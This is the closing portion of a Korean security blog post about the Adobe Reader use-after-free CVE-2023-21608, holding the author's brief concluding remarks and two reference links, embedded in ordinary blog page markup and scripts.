<h1 id="Fini"><a href="#Fini" class="headerlink" title="Fini"></a>Fini</h1><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCC98;&#xC74C;&#xC774;&#xC5C8;&#xB294;&#xB370; &#xC815;&#xB9D0; &#xC27D;&#xC9C0; &#xC54A;&#xB124;&#xC694;&#x2026; &#xC774;&#xB7F0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB9C8;&#xAD6C; &#xCC3E;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC740; &#xB300;&#xCCB4; &#xBB50;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC77C;&#xAE4C; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xCC38;&#xACE0;&#xD560;&#xB9CC;&#xD55C; &#xC88B;&#xC740; &#xB808;&#xD37C;&#xB7F0;&#xC2A4;&#xAC00; &#xC788;&#xC5B4;&#xC11C; &#xC27D;&#xAC8C;?&#x2026; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB294;&#xB370; &#xD328;&#xCE58; &#xBD84;&#xC11D; &#xB0B4;&#xC6A9;&#xC740; &#xC5C6;&#xC5B4;&#xC11C; &#xC9C1;&#xC811; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xC7AC;&#xBC0C;&#xAE30;&#xB3C4; &#xD588;&#xACE0;&#xC694; &#xC2DC;&#xAC04;&#xB9CC; &#xC788;&#xB2E4;&#xBA74; &#xC55E;&#xC73C;&#xB85C;&#xB3C4; &#xC774;&#xB7F0; &#xAE00; &#xB9CE;&#xC774; &#xC368;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608">https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/hacksysteam/CVE-2023-21608">https://github.com/hacksysteam/CVE-2023-21608</a></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/UAF/">UAF</a>
                  
                  <a class="hover-with-bg" href="/tags/pwndorei/">pwndorei</a>
                  
                  <a class="hover-with-bg" href="/tags/Adobe/">Adobe</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_pwndorei.jpg" srcset="/img/loading.gif" alt="pwndorei">
                  </div>

                  <div class="link-text">
                    <div class="link-title">pwndorei</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/pwndorei">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>
              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              
              <!--  -->
              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2024/08/07/ogu123/cve-2024-2952/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[하루한줄] CVE-2024-2952: LiteLLM의 SSTI 취약점</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2024/07/31/pwndorei/2024-07-31/">
                    <span class="hidden-mobile">[하루한줄] CVE-2024-21778: Realtek rtl819x Jungle SDK에서 발생한 Heap-based buffer overflow 취약점</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_CVE-2023-21608/';
        this.page.identifier = '/2024/08/04/pwndorei/1day1document_CVE-2023-21608/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] 1day1document : CVE-2023-21608&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
